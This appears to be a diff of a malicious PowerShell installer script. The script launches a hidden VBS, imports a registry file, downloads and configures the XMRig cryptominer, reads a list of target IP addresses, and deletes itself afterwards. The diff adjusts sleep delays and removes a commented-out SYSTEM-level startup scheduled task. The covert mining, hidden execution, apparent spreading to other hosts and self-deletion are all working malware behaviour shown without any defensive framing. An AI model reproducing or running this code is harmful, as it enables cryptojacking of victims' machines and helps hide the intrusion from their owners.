@@ -100,6 +100,8 @@ Get-NetFirewallRule -Name *ssh*
 ./wrev.reg; ./calty
 mv $path\RunHidden.vbs $initial_dir
 
+
+Start-Sleep -Seconds 30
 ./RunHidden
 
 
@@ -112,8 +114,6 @@ $currentDirectory = $PWD
 
 # Download the ZIP file
 Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip" -OutFile "xmrig-6.22.2-msvc-win64.zip"
-
-#powershell -windowstyle hidden -ep bypass curl -o "/home/kali/Documents/xmrig-6.22.2-msvc-win64.zip" https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip 
 
 # Extract the ZIP file in the current directory
 Expand-Archive -Path "$currentDirectory\xmrig-6.22.2-msvc-win64.zip" -DestinationPath "$currentDirectory"
@@ -131,27 +131,6 @@ if (Test-Path -Path $newConfigPath) {
 } else {
     Write-Output "New config.json file not found at the specified path."
 }
-
-# Define the path to the CMD file
-#$CMDFilePath = "currentDirectory\start.cmd"
-
-# Define the task name
-#$TaskName = "windows host start"
-
-# Create the scheduled task action
-#$Action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c `"$CMDFilePath`""
-
-# Create the scheduled task trigger for startup
-#$Trigger = New-ScheduledTaskTrigger -AtStartup
-
-# Create the scheduled task settings
-#$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartIfOnBatteries
-
-# Register the scheduled task
-#Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -User "SYSTEM"
-
-#Write-Host "Scheduled task created successfully. Your CMD file will now run at startup."
-
 
 # Define the path to the text file with IP addresses
 $ipFile = "$path\Ips.txt"
@@ -248,7 +227,7 @@ if (Test-Path -Path '.Venom' -PathType Container) {
 # self delete
 cd $initial_dir
 
-Sleep (200)
+
 
 del installer.ps1
 
